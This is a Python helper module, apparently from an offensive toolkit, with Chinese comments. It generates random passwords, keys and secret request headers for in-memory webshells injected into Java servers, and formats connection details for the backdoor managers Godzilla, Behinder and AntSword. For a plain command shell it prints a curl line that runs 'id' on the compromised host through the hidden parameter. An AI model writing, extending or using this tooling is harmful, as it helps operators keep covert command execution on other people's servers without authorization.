"""内存马密码 / 连接信息。"""

from __future__ import annotations

import secrets
import string
from typing import Any

_RAND_ALPHABET = string.ascii_letters + string.digits


def rand_token(n: int = 8) -> str:
    return "".join(secrets.choice(_RAND_ALPHABET) for _ in range(n))


def randomize_memshell_auth(tool: str) -> dict[str, str]:
    """为内存马随机生成密码 / 密钥 / 校验请求头 / Command 参数名。"""
    auth = {
        "param_name": rand_token(6),
        "header_name": f"X-{rand_token(6)}",
        "header_value": rand_token(12),
        "godzilla_pass": rand_token(8),
        "godzilla_key": rand_token(8),
        "behinder_pass": rand_token(8),
        "antsword_pass": rand_token(8),
    }
    if tool == "Command" and auth["param_name"][0].isdigit():
        auth["param_name"] = "p" + auth["param_name"][1:]
    return auth


def format_memshell_connect_info(memshell: dict[str, Any], target: str = "") -> str:
    """格式化注入后的连接信息（密码与请求头均已随机）。"""
    tool = memshell.get("tool") or ""
    path = memshell.get("url_pattern") or "/*"
    h_name = memshell.get("header_name") or ""
    h_value = memshell.get("header_value") or ""
    connect_url = target.rstrip("/") if target else ""
    if connect_url:
        if path not in ("/*", "*", ""):
            p = path.split("*", 1)[0]
            if not p.startswith("/"):
                p = "/" + p
            connect_url = connect_url.rstrip("/") + (p.rstrip("/") or "")
        else:
            connect_url = connect_url + "/json"

    lines = [
        f"tool={tool} type={memshell.get('shell_type')} server={memshell.get('server')}",
        f"urlPattern={path}",
    ]
    if connect_url:
        lines.append(f"url={connect_url}")
    lines.append(f"header={h_name}:{h_value}")
    lines.append(f"headerLine={h_name}: {h_value}")
    if tool == "Godzilla":
        lines.append(f"pass={memshell.get('godzilla_pass')}")
        lines.append(f"key={memshell.get('godzilla_key')}")
        lines.append("tip=Godzilla 选 JAVA_AES_BASE64；自定义头填 headerLine")
    elif tool == "Behinder":
        lines.append(f"pass={memshell.get('behinder_pass')}")
        lines.append(
            "tip=冰蝎: 脚本类型jsp / 加密默认; "
            "URL建议带/json; 自定义请求头必须用「Name: value」不要用 Name=value"
        )
    elif tool == "AntSword":
        lines.append(f"pass={memshell.get('antsword_pass')}")
        lines.append("tip=自定义头填 headerLine（Name: value）")
    elif tool == "Command":
        lines.append(f"param={memshell.get('param_name')}")
        lines.append(
            f"tip=curl -H '{h_name}: {h_value}' "
            f"'{connect_url or '<url>'}?{memshell.get('param_name')}=id'"
        )
    lines.append(f"shellClass={memshell.get('shell_class')}")
    lines.append(f"injector={memshell.get('injector_class')}")
    return "\n".join(lines)
